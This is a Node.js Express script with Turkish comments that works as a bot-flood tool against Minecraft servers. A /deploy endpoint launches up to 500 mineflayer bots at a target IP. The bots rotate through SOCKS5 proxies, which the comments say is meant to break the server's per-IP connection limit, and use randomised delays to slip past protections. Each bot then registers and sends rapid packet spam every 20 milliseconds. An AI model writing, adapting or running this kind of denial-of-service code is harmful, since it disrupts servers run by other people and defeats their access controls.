const mineflayer = require('mineflayer');
const { ProxyAgent } = require('proxy-agent');
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

// 🛡️ KRİTİK: BURAYA EN AZ 20-30 TANE SOCKS5 PROXY KOYMALISIN!
// Eğer proxy yoksa sunucu senin gerçek IP'ni görür ve sadece 1 bot sokar.
const proxyList = [
    "socks5://ip1:port1",
    "socks5://ip2:port2",
    "socks5://ip3:port3"
    // Burayı internetten bulduğun taze proxylerle doldur kanka!
];

app.post('/deploy', (req, res) => {
    const { ip, count } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[!!! LIMIT BREAKER ACTIVE !!!] Hedef: ${host}`);

    for (let i = 0; i < Math.min(count, 500); i++) {
        // Rastgele gecikme ekleyerek (500ms - 1500ms arası) korumayı atlatıyoruz
        const randomDelay = Math.floor(Math.random() * 1000) + (i * 100); 
        
        setTimeout(() => {
            const currentProxy = proxyList[i % proxyList.length];
            if (!currentProxy) return;

            const agent = new ProxyAgent(currentProxy);

            const bot = mineflayer.createBot({
                host: host,
                port: port,
                username: `Vip_Resul_${Math.floor(Math.random() * 999999)}`,
                version: false,
                agent: agent, // IP SINIRINI BU DELER
                hideErrors: true,
                skipValidation: true
            });

            bot.on('spawn', () => {
                console.log(`[⚡] LIMIT DELINDI: ${bot.username} İÇERİDE!`);
                bot.chat(`/register resul3163 resul3163`);
                bot.chat(`/login resul3163`);
                
                // Sunucuyu paket yağmuruna tut (Party Time!)
                setInterval(() => {
                    if(bot.entity) {
                        bot.look(Math.random() * 360, 0);
                        bot.swingArm('right');
                        bot.setControlState('jump', true);
                    }
                }, 20); 
            });

            bot.on('error', (err) => console.log(`[!] Giriş Engellendi: ${err.message}`));
        }, randomDelay); 
    }
    res.json({ success: true, message: "Limit kırıcı ordu yola çıktı!" });
});

app.listen(process.env.PORT || 3000);
